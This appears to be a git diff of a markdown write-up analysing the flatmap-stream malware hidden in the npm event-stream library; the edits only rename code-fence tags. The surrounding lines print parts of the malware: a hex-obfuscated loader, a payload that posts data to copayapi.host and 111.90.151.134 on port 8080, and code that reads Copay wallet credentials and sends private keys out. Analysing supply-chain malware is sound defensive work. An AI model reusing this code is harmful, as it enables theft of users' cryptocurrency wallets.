@@ -10,7 +10,7 @@ flatmap-stream was included as a dependency in a widely used NPM library event-s
 
 ## Prettifying the code
 
-```javascript
+```js
 !(function() {
   try {
     var r = require,
@@ -39,14 +39,14 @@ The first thing of note is the `e` function, which converts hex strings. The pay
 
 First string:
 
-```javascript
+```js
 > decode("2e2f746573742f64617461")
 './test/data'
 ```
 
 This line imports code from the ./test/data folder, which contains 10 more hex obfuscated strings.
 
-```javascript
+```js
 module.exports = [
   '...truncated...',
   '...truncated...',
@@ -63,7 +63,7 @@ module.exports = [
 
 After decoding and unobfuscating the code, we get
 
-```javascript
+```js
 !(function() {
   try {
     var r = require,
@@ -98,7 +98,7 @@ This bootstrapping script is looking for a specific module name to properly deco
 
 ## The first payload
 
-```javascript
+```js
 module.exports = function(e) {
   try {
     // Exit if specific args aren't in the command line
@@ -141,14 +141,14 @@ After decrypting the second payload with the key listed above, we find the meat 
 
 ### POST to copayapi.host:8080 and 111.90.151.134:8080 with url e and payload n
 
-```javascript
+```js
 postToUrl('636f7061796170692e686f7374', e, n),
   postToUrl('3131312e39302e3135312e313334', e, n);
 ```
 
 ### Look for wallet files and send the wallet data to hosts above
 
-```javascript
+```js
 readFromFile('profile', function(e) {
   for (var t in e.credentials) {
     var n = e.credentials[t];
@@ -173,7 +173,7 @@ readFromFile('profile', function(e) {
 
 ### Extract wallet keys and send to hosts above
 
-```javascript
+```js
 var e = require('bitcore-wallet-client/lib/credentials.js');
 // Extends getKeysFunc to send all the key information
 // Also sends xPubKey previously set in the global var, and clears it
